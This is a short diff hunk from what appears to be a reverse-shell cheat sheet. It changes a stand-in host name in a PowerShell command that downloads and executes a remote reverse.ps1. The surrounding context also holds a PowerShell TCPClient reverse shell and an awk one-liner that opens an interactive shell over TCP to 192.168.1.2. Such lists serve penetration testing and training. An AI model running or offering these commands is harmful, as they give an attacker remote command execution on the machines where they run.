@@ -75,7 +75,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1
 
 ## or
 
-powershell IEX (New-Object Net.WebClient).DownloadString('https://www.EVILURL.com/reverse.ps1')
+powershell IEX (New-Object Net.WebClient).DownloadString('https://www.evil.com/reverse.ps1')
 
 ## Awk
 awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
